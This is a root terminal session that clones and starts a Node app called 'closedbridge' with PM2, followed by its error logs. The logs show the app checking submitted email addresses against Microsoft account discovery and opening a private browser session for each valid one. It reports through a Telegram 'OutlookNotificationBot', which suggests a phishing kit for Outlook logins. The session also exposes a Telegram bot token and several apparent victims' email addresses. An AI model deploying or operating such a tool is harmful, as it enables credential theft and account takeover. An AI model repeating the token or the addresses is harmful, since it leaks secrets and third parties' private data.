Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Nov  9 13:36:27 UTC 2025

  System load:  0.23               Processes:             109
  Usage of /:   21.5% of 23.10GB   Users logged in:       1
  Memory usage: 43%                IPv4 address for eth0: 167.71.165.86
  Swap usage:   0%                 IPv4 address for eth0: 10.17.0.5

52 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '25.10' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
root@ubuntu-s-1vcpu-1gb-nyc3-01:~# # Stop the running app
pm2 delete closedbridge

# Delete the old directory
rm -rf /root/closedbridge

# Clone fresh from GitHub
cd /root
git clone https://github.com/x8080x2/L1n7k.git closedbridge
cd closedbridge

# Install packages
npm install

# Add your Telegram token to .env
nano .env
# Add this line: TELEGRAM_BOT_TOKEN=8390642583:AAFZTE-vkfBJn3GzBl6ST_qT3iYbbnIvd0g

# Start with PM2
pm2 start server.js --name closedbridge
pm2 save
pm2 logs closedbridge
[PM2] Applying action deleteProcessId on app [closedbridge](ids: [ 0 ])
[PM2] [closedbridge](0) ✓
┌────┬───────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id │ name      │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
└────┴───────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
Cloning into 'closedbridge'...
remote: Enumerating objects: 3221, done.
remote: Counting objects: 100% (692/692), done.
remote: Compressing objects: 100% (309/309), done.
remote: Total 3221 (delta 461), reused 605 (delta 382), pack-reused 2529 (from 1)
Receiving objects: 100% (3221/3221), 22.53 MiB | 29.77 MiB/s, done.
Resolving deltas: 100% (1996/1996), done.
npm warn deprecated har-validator@5.1.5: this library is no longer supported
npm warn deprecated uuid@3.4.0: Please upgrade  to version 7 or higher.  Older versions may use Math.random() in certain circumstances, which is known to be problematic.  See https://v8.dev/blog/math-random for details.
npm warn deprecated request@2.88.2: request has been deprecated, see https://github.com/request/request/issues/3142

added 320 packages, and audited 321 packages in 23s

84 packages are looking for funding
  run `npm fund` for details

6 vulnerabilities (4 moderate, 2 critical)

To address all issues (including breaking changes), run:
  npm audit fix --force

Run `npm audit` for details.
[PM2] Starting /root/closedbridge/server.js in fork_mode (1 instance)
[PM2] Done.
┌────┬─────────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id │ name            │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├────┼─────────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0  │ closedbridge    │ default     │ 1.0.0   │ fork    │ 159321   │ 0s     │ 0    │ online    │ 0%       │ 18.2mb   │ root     │ disabled │
└────┴─────────────────┴─────────────┴─────────┴─────────┴─────────���┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
[PM2] Saving current process list...
[PM2] Successfully saved in /root/.pm2/dump.pm2
[TAILING] Tailing last 15 lines for [closedbridge] process (change the value with --lines option)
/root/.pm2/logs/closedbridge-error.log last 15 lines:
0|closedbr | ⚠️ Proactive browser preparation failed (server continues normally): Browser was not found at the configured executablePath (/nix/store/qa9cnw4v5xkxyip6mb9kxqfq1z4x2dx1-chromium-138.0.7204.100/bin/chromium)
0|closedbridge  | Raw Microsoft discovery response for dassola8080@gmail.com: {
0|closedbridge  |   ver: '1.0',
0|closedbridge  |   account_type: 'Federated',
0|closedbridge  |   domain_name: 'live.com',
0|closedbridge  |   federation_protocol: 'WSTrust',
0|closedbridge  |   federation_metadata_url: 'https://nexus.passport.com/FederationMetadata/2007-06/FederationMetadata.xml',
0|closedbridge  |   federation_active_auth_url: 'https://login.live.com/rst2.srf',
0|closedbridge  |   cloud_instance_name: 'microsoftonline.com',
0|closedbridge  |   cloud_audience_urn: 'urn:federation:MicrosoftOnline'
0|closedbridge  | }
0|closedbridge  | ❌ Email verification failed for: dassola8080@gmail.com - Account not found or not managed by Microsoft
0|closedbridge  | Discovery response: {
0|closedbridge  |   ver: '1.0',
0|closedbridge  |   account_type: 'Federated',
0|closedbridge  |   domain_name: 'live.com',
0|closedbridge  |   federation_protocol: 'WSTrust',
0|closedbridge  |   federation_metadata_url: 'https://nexus.passport.com/FederationMetadata/2007-06/FederationMetadata.xml',
0|closedbridge  |   federation_active_auth_url: 'https://login.live.com/rst2.srf',
0|closedbridge  |   cloud_instance_name: 'microsoftonline.com',
0|closedbridge  |   cloud_audience_urn: 'urn:federation:MicrosoftOnline'
0|closedbridge  | }
0|closedbridge  | Raw Microsoft discovery response for jaco@smei.co.za: {
0|closedbridge  |   ver: '1.0',
0|closedbridge  |   account_type: 'Managed',
0|closedbridge  |   domain_name: 'smei.co.za',
0|closedbridge  |   cloud_instance_name: 'microsoftonline.com',
0|closedbridge  |   cloud_audience_urn: 'urn:federation:MicrosoftOnline'
0|closedbridge  | }
0|closedbridge  | ✅ Email verification passed for: jaco@smei.co.za (Account type: Managed)
0|closedbridge  | 🚀 Starting enhanced browser preload for session: 1762695707667_asktz, email: jaco@smei.co.za
0|closedbridge  | 🔧 Creating private browser for: 1762695707667_asktz, email: jaco@smei.co.za
0|closedbridge  | Using system Chromium: /usr/bin/chromium-browser
0|closedbridge  | Launching browser...
0|closedbridge  | ✅ Email verification successful for: jaco@smei.co.za (Account type: Managed)
0|closedbridge  | ❌ Browser preload error for jaco@smei.co.za: Timed out after 30000 ms while waiting for the WS endpoint URL to appear in stdout!
0|closedbridge  | ⚠️ Browser preload failed for jaco@smei.co.za: Timed out after 30000 ms while waiting for the WS endpoint URL to appear in stdout!
0|closedbridge  | TypeError: Invalid URL
0|closedbridge  |     at new URL (node:internal/url:806:29)
0|closedbridge  |     at OutlookNotificationBot.handleAdminPanel (/root/closedbridge/telegram-bot.js:253:33)
0|closedbridge  |     at OutlookNotificationBot.handleCallbackQuery (/root/closedbridge/telegram-bot.js:214:28)
0|closedbridge  |     at TelegramBot.<anonymous> (/root/closedbridge/telegram-bot.js:192:18)
0|closedbridge  |     at TelegramBot.emit (/root/closedbridge/node_modules/eventemitter3/index.js:181:35)
0|closedbridge  |     at TelegramBot.processUpdate (/root/closedbridge/node_modules/node-telegram-bot-api/src/telegram.js:792:12)
0|closedbridge  |     at /root/closedbridge/node_modules/node-telegram-bot-api/src/telegramPolling.js:110:22
0|closedbridge  |     at Array.forEach (<anonymous>)
0|closedbridge  |     at /root/closedbridge/node_modules/node-telegram-bot-api/src/telegramPolling.js:106:17
0|closedbridge  |     at tryCatcher (/root/closedbridge/node_modules/bluebird/js/release/util.js:16:23)
0|closedbridge  |     at Promise._settlePromiseFromHandler (/root/closedbridge/node_modules/bluebird/js/release/promise.js:547:31)
0|closedbridge  |     at Promise._settlePromise (/root/closedbridge/node_modules/bluebird/js/release/promise.js:604:18)
0|closedbridge  |     at Promise._settlePromise0 (/root/closedbridge/node_modules/bluebird/js/release/promise.js:649:10)
0|closedbridge  |     at Promise._settlePromises (/root/closedbridge/node_modules/bluebird/js/release/promise.js:729:18)
0|closedbridge  |     at _drainQueueStep (/root/closedbridge/node_modules/bluebird/js/release/async.js:93:12)
0|closedbridge  |     at _drainQueue (/root/closedbridge/node_modules/bluebird/js/release/async.js:86:9)
0|closedbridge  |     at Async._drainQueues (/root/closedbridge/node_modules/bluebird/js/release/async.js:102:5)
0|closedbridge  |     at Async.drainQueues (/root/closedbridge/node_modules/bluebird/js/release/async.js:15:14)
0|closedbridge  |     at process.processImmediate (node:internal/timers:483:21) {
0|closedbridge  |   code: 'ERR_INVALID_URL',
0|closedbridge  |   input: '/api/auth-callback'
0|closedbridge  | }
0|closedbridge  | TypeError: Invalid URL
0|closedbridge  |     at new URL (node:internal/url:806:29)
0|closedbridge  |     at OutlookNotificationBot.handleAdminPanel (/root/closedbridge/telegram-bot.js:253:33)
0|closedbridge  |     at OutlookNotificationBot.handleCallbackQuery (/root/closedbridge/telegram-bot.js:214:28)
0|closedbridge  |     at TelegramBot.<anonymous> (/root/closedbridge/telegram-bot.js:192:18)
0|closedbridge  |     at TelegramBot.emit (/root/closedbridge/node_modules/eventemitter3/index.js:181:35)
0|closedbridge  |     at TelegramBot.processUpdate (/root/closedbridge/node_modules/node-telegram-bot-api/src/telegram.js:792:12)
0|closedbridge  |     at /root/closedbridge/node_modules/node-telegram-bot-api/src/telegramPolling.js:110:22
0|closedbridge  |     at Array.forEach (<anonymous>)
0|closedbridge  |     at /root/closedbridge/node_modules/node-telegram-bot-api/src/telegramPolling.js:106:17
0|closedbridge  |     at tryCatcher (/root/closedbridge/node_modules/bluebird/js/release/util.js:16:23)
0|closedbridge  |     at Promise._settlePromiseFromHandler (/root/closedbridge/node_modules/bluebird/js/release/promise.js:547:31)
0|closedbridge  |     at Promise._settlePromise (/root/closedbridge/node_modules/bluebird/js/release/promise.js:604:18)
0|closedbridge  |     at Promise._settlePromise0 (/root/closedbridge/node_modules/bluebird/js/release/promise.js:649:10)
0|closedbridge  |     at Promise._settlePromises (/root/closedbridge/node_modules/bluebird/js/release/promise.js:729:18)
0|closedbridge  |     at _drainQueueStep (/root/closedbridge/node_modules/bluebird/js/release/async.js:93:12)
0|closedbridge  |     at _drainQueue (/root/closedbridge/node_modules/bluebird/js/release/async.js:86:9)
0|closedbridge  |     at Async._drainQueues (/root/closedbridge/node_modules/bluebird/js/release/async.js:102:5)
0|closedbridge  |     at Async.drainQueues (/root/closedbridge/node_modules/bluebird/js/release/async.js:15:14)
0|closedbridge  |     at process.processImmediate (node:internal/timers:483:21) {
0|closedbridge  |   code: 'ERR_INVALID_URL',
0|closedbridge  |   input: '/api/auth-callback'
0|closedbridge  | }
0|closedbridge  | TypeError: Invalid URL
0|closedbridge  |     at new URL (node:internal/url:806:29)
0|closedbridge  |     at OutlookNotificationBot.handleAdminPanel (/root/closedbridge/telegram-bot.js:253:33)
0|closedbridge  |     at OutlookNotificationBot.handleCallbackQuery (/root/closedbridge/telegram-bot.js:214:28)
0|closedbridge  |     at TelegramBot.<anonymous> (/root/closedbridge/telegram-bot.js:192:18)
0|closedbridge  |     at TelegramBot.emit (/root/closedbridge/node_modules/eventemitter3/index.js:181:35)
0|closedbridge  |     at TelegramBot.processUpdate (/root/closedbridge/node_modules/node-telegram-bot-api/src/telegram.js:792:12)
0|closedbridge  |     at /root/closedbridge/node_modules/node-telegram-bot-api/src/telegramPolling.js:110:22
0|closedbridge  |     at Array.forEach (<anonymous>)
0|closedbridge  |     at /root/closedbridge/node_modules/node-telegram-bot-api/src/telegramPolling.js:106:17
0|closedbridge  |     at tryCatcher (/root/closedbridge/node_modules/bluebird/js/release/util.js:16:23)
0|closedbridge  |     at Promise._settlePromiseFromHandler (/root/closedbridge/node_modules/bluebird/js/release/promise.js:547:31)
0|closedbridge  |     at Promise._settlePromise (/root/closedbridge/node_modules/bluebird/js/release/promise.js:604:18)
0|closedbridge  |     at Promise._settlePromise0 (/root/closedbridge/node_modules/bluebird/js/release/promise.js:649:10)
0|closedbridge  |     at Promise._settlePromises (/root/closedbridge/node_modules/bluebird/js/release/promise.js:729:18)
0|closedbridge  |     at _drainQueueStep (/root/closedbridge/node_modules/bluebird/js/release/async.js:93:12)
0|closedbridge  |     at _drainQueue (/root/closedbridge/node_modules/bluebird/js/release/async.js:86:9)
0|closedbridge  |     at Async._drainQueues (/root/closedbridge/node_modules/bluebird/js/release/async.js:102:5)
0|closedbridge  |     at Async.drainQueues (/root/closedbridge/node_modules/bluebird/js/release/async.js:15:14)
0|closedbridge  |     at process.processImmediate (node:internal/timers:483:21) {
0|closedbridge  |   code: 'ERR_INVALID_URL',
0|closedbridge  |   input: '/api/auth-callback'
0|closedbridge  | }
0|closedbridge  | TypeError: Invalid URL
0|closedbridge  |     at new URL (node:internal/url:806:29)
0|closedbridge  |     at OutlookNotificationBot.handleAdminPanel (/root/closedbridge/telegram-bot.js:253:33)
0|closedbridge  |     at OutlookNotificationBot.handleCallbackQuery (/root/closedbridge/telegram-bot.js:214:28)
0|closedbridge  |     at TelegramBot.<anonymous> (/root/closedbridge/telegram-bot.js:192:18)
0|closedbridge  |     at TelegramBot.emit (/root/closedbridge/node_modules/eventemitter3/index.js:181:35)
0|closedbridge  |     at TelegramBot.processUpdate (/root/closedbridge/node_modules/node-telegram-bot-api/src/telegram.js:792:12)
0|closedbridge  |     at /root/closedbridge/node_modules/node-telegram-bot-api/src/telegramPolling.js:110:22
0|closedbridge  |     at Array.forEach (<anonymous>)
0|closedbridge  |     at /root/closedbridge/node_modules/node-telegram-bot-api/src/telegramPolling.js:106:17
0|closedbridge  |     at tryCatcher (/root/closedbridge/node_modules/bluebird/js/release/util.js:16:23)
0|closedbridge  |     at Promise._settlePromiseFromHandler (/root/closedbridge/node_modules/bluebird/js/release/promise.js:547:31)
0|closedbridge  |     at Promise._settlePromise (/root/closedbridge/node_modules/bluebird/js/release/promise.js:604:18)
0|closedbridge  |     at Promise._settlePromise0 (/root/closedbridge/node_modules/bluebird/js/release/promise.js:649:10)
0|closedbridge  |     at Promise._settlePromises (/root/closedbridge/node_modules/bluebird/js/release/promise.js:729:18)
0|closedbridge  |     at _drainQueueStep (/root/closedbridge/node_modules/bluebird/js/release/async.js:93:12)
0|closedbridge  |     at _drainQueue (/root/closedbridge/node_modules/bluebird/js/release/async.js:86:9)
0|closedbridge  |     at Async._drainQueues (/root/closedbridge/node_modules/bluebird/js/release/async.js:102:5)
0|closedbridge  |     at Async.drainQueues (/root/closedbridge/node_modules/bluebird/js/release/async.js:15:14)
0|closedbridge  |     at process.processImmediate (node:internal/timers:483:21) {
0|closedbridge  |   code: 'ERR_INVALID_URL',
0|closedbridge  |   input: '/api/auth-callback'
0|closedbridge  | }
